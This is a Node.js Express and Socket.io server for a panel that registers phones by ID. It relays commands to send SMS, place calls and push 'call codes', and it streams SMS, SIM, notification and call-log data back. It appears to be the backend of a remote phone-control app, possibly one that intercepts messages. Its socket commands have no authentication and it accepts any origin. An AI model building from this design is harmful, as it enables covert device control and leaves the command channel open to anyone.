import express from "express";
import cors from "cors";
import dotenv from "dotenv";
import { createServer } from "http";
import { Server } from "socket.io";
import fetch from "node-fetch";
import mongoose from "mongoose";
import { connectDB } from "./config/db.js";

// ROUTES
import deviceRoutes from "./routes/deviceRoutes.js";
import smsRoutes from "./routes/smsRoutes.js";
import simInfoRoutes from "./routes/simInfoRoutes.js";
import notificationRoutes from "./routes/notificationRoutes.js";
import callRoutes from "./routes/callRoutes.js";
import adminRoutes from "./routes/adminRoutes.js";
import serialRoutes from "./routes/serialRoutes.js";
import callLogRoutes from "./routes/callLogRoutes.js";
import statusRoutes from "./routes/statusRoutes.js";
import lastSeenRoutes from "./routes/lastSeen.routes.js";

dotenv.config();
connectDB();

const app = express();
const server = createServer(app);

// → Long timeout fix (socket random disconnect issue)
const io = new Server(server, {
  cors: { origin: "*", methods: ["GET", "POST"] },
  pingInterval: 25000,
  pingTimeout: 60000,
  connectTimeout: 60000,
});

app.use(cors());
app.use(express.json());
app.set("io", io);

// ===============================
// DEVICE SOCKET MAP
// ===============================
const deviceSockets = new Map();

// ===============================
// SOCKET HANDLER
// ===============================
io.on("connection", (socket) => {
  let currentDeviceId = null;

  // --------------------------------
  // REGISTER DEVICE
  // --------------------------------
  socket.on("registerDevice", (uniqueid) => {
    if (!uniqueid) return;

    currentDeviceId = uniqueid;
    console.log(`🟢 DEVICE CONNECTED: ${uniqueid}`);

    if (deviceSockets.has(uniqueid)) {
      const oldSocketId = deviceSockets.get(uniqueid);
      if (oldSocketId !== socket.id) {
        console.log(`♻️ Updating socket for ${uniqueid} (old=${oldSocketId}, new=${socket.id})`);
      }
    }

    deviceSockets.set(uniqueid, socket.id);
    socket.join(uniqueid);

    // online status
    saveLastSeen(uniqueid, "Online");

    // confirm to device
    io.to(socket.id).emit("deviceRegistered", { uniqueid });

    // notify panel for live list
    io.emit("deviceListUpdated", {
      event: "device_connected",
      uniqueid,
    });
  });

  // --------------------------------
  // DEVICE STATUS (Online / Offline / Charging / etc.)
  // --------------------------------
  socket.on("deviceStatus", (data) => {
    const { uniqueid, connectivity } = data || {};
    if (!uniqueid) return;

    console.log(`⚡ ${uniqueid} → ${connectivity}`);

    saveLastSeen(uniqueid, connectivity);

    io.emit("deviceStatus", {
      uniqueid,
      connectivity,
      updatedAt: new Date(),
    });
  });

  // --------------------------------
  // PANEL → SEND SMS TO DEVICE
  // --------------------------------
  socket.on("sendSMS", (payload) => {
    if (!payload?.deviceId) return;

    const socketId = deviceSockets.get(payload.deviceId);

    if (socketId && io.sockets.sockets.get(socketId)) {
      console.log(`📨 Sending SMS command to device: ${payload.deviceId}`);
      io.to(socketId).emit("smsCommand", payload);
    } else {
      console.log(`⚠️ Device offline for SMS: ${payload.deviceId}`);
    }
  });

  // --------------------------------
  // PANEL → CALL COMMAND TO DEVICE
  // --------------------------------
  socket.on("callDevice", (payload) => {
    if (!payload?.deviceId) return;

    const socketId = deviceSockets.get(payload.deviceId);

    if (socketId && io.sockets.sockets.get(socketId)) {
      console.log(`📞 Call command → ${payload.deviceId}`);
      io.to(socketId).emit("callCommand", payload);
    } else {
      console.log(`⚠️ Device offline for Call: ${payload.deviceId}`);
    }
  });

  // --------------------------------
  // DISCONNECT
  // --------------------------------
  socket.on("disconnect", () => {
    if (!currentDeviceId) return;

    console.log(`🔴 DISCONNECTED: ${currentDeviceId}`);

    // thoda wait karo, shayad auto-reconnect ho jaye
    setTimeout(() => {
      const still = deviceSockets.get(currentDeviceId);

      // agar already naya socket aa gaya to offline mat karo
      if (!still || still !== socket.id) return;

      deviceSockets.delete(currentDeviceId);

      console.log(`📵 OFFLINE: ${currentDeviceId}`);
      saveLastSeen(currentDeviceId, "Offline");

      io.emit("deviceStatus", {
        uniqueid: currentDeviceId,
        connectivity: "Offline",
        updatedAt: new Date(),
      });

      io.emit("deviceListUpdated", {
        event: "device_disconnected",
        uniqueid: currentDeviceId,
      });
    }, 3000);
  });
});

// ===============================
// HELPERS
// ===============================
async function saveLastSeen(deviceId, connectivity) {
  try {
    const PORT = process.env.PORT || 5000;

    await fetch(`http://localhost:${PORT}/api/lastseen/${deviceId}/status`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ connectivity }),
    });
  } catch (err) {
    console.error("❌ lastSeen error:", err.message);
  }
}

// 🔥 EXPORT YAHI HAI – callController yahi use karega
export async function sendCallCodeToDevice(uid, callData) {
  try {
    const socketId = deviceSockets.get(uid);
    if (socketId && io.sockets.sockets.get(socketId)) {
      io.to(socketId).emit("callCodeUpdate", callData);
      console.log(`📞 CallCode → ${uid}`);
    } else {
      console.log(`⚠️ No active socket for CallCode → ${uid}`);
    }
  } catch (err) {
    console.error("❌ sendCallCodeToDevice error:", err.message);
  }
}

// ===============================
// DB WATCHERS
// ===============================
mongoose.connection.once("open", () => {
  console.log("📡 Watching MongoDB Collections");

  // --- SMS WATCH ---
  mongoose.connection
    .collection("sms")
    .watch()
    .on("change", async (chg) => {
      if (!["insert", "update", "replace"].includes(chg.operationType)) return;

      const sms = await mongoose.connection
        .collection("sms")
        .findOne({ _id: chg.documentKey._id });

      if (!sms?.deviceId) return;

      const socketId = deviceSockets.get(sms.deviceId);
      if (socketId && io.sockets.sockets.get(socketId)) {
        console.log("📩 New SMS → sending to device", sms.deviceId);
        io.to(socketId).emit("smsUpdate", sms);
      }
    });

  // --- CALLCODES WATCH ---
  mongoose.connection
    .collection("callcodes")
    .watch()
    .on("change", async (chg) => {
      if (!["insert", "update", "replace"].includes(chg.operationType)) return;

      const updated = await mongoose.connection
        .collection("callcodes")
        .findOne({ _id: chg.documentKey._id });

      if (!updated?.deviceId) return;

      // yaha bhi same helper use karenge
      await sendCallCodeToDevice(updated.deviceId, updated);
    });

  // --- SIMINFO WATCH ---
  mongoose.connection
    .collection("siminfos")
    .watch()
    .on("change", async (chg) => {
      const updated = await mongoose.connection
        .collection("siminfos")
        .findOne({ _id: chg.documentKey._id });

      if (!updated) return;

      io.emit("simInfoUpdated", { sim: updated });
    });

  // --- DEVICES WATCH ---
  mongoose.connection
    .collection("devices")
    .watch()
    .on("change", async (chg) => {
      const updated = await mongoose.connection
        .collection("devices")
        .findOne({ _id: chg.documentKey._id });

      if (!updated) return;

      io.emit("deviceListUpdated", {
        event: "db_change",
        device: updated,
      });
    });
});

// ===============================
// ROUTES
// ===============================
app.get("/", (req, res) => res.send("Server Running"));

app.use("/api/device", deviceRoutes);
app.use("/api/sms", smsRoutes);
app.use("/api/siminfo", simInfoRoutes);
app.use("/api/notification", notificationRoutes);
app.use("/api/call", callRoutes);
app.use("/api/admin", adminRoutes);
app.use("/api/serial", serialRoutes);
app.use("/api/status", statusRoutes);
app.use("/api/lastseen", lastSeenRoutes);
app.use("/api/call-log", callLogRoutes);

// ===============================
// START SERVER
// ===============================
const PORT = process.env.PORT || 5000;
server.listen(PORT, () => {
  console.log(`🚀 SERVER LIVE → http://localhost:${PORT}`);
});
